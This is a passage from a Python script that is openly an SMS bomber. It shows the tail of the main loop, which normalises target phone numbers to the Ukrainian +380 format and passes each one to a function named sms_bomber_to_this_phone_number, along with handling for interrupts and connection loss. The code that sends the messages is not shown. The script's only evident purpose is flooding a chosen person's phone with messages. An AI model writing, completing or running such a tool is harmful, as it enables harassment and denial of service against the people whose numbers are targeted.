                        phone_number_slice_4 and phone_number[1:].isdigit() 
                        or phone_number_slice_3 
                        or phone_number_slice_0 and phone_number.isdigit() 
                        or phone_number_slice_digit and phone_number.isdigit()
                    ):
                        if phone_number[:3] == '380':
                            phone_number = '+' + phone_number
                        elif phone_number[0] == '0': 
                            phone_number = '+38' + phone_number
                        elif phone_number_slice_digit and phone_number[:4] != '+380' and phone_number[0] != '0': 
                            phone_number = '+380' + phone_number
                            
                        sms_bomber_to_this_phone_number(target_phone_number=phone_number)
                    else:
                        print(f'Phone number is incorrect --> {phone_number}') 
        except StopIteration: 
            _how_many_messages_sent = 0
            _how_many_messages_were_not_sent = 0
        except BaseException as error:
            match error:
                case KeyboardInterrupt() | ConnectionError() | EOFError(): 
                    if type(error) is ConnectionError:
                        print('\n|---Reason for stopping --- Internet shutdown---|\n')
                        _check_internet_connection = 0
                    else:
                        print()
                case _:
                    if not phone_number == '':
                        print('Unavailable value')


main()
